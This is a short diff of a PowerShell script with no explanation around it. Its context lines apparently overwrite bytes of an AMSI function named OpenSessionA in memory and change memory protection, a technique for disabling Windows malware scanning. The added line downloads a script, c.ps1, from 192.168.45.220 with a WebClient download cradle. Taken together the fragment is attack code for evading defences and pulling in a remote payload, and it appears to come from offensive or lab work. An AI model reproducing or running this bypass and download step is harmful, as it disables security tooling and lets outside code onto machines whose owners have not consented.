@@ -42,3 +42,5 @@ $marshalType = [System.Runtime.InteropServices.Marshal]
 $cm = $marshalType.GetMethod('Copy', [Type[]] @([byte[]], [int], [IntPtr], [int]))
 $cm.Invoke($null, @($buf, 0, $OpenSessionA, 3))
 $vp.Invoke($OpenSessionA, 3, 0x20, [ref]$oldProtectionBuffer)
+
+(new-Object net.webclient).downloadstring('http://192.168.45.220/c.ps1')
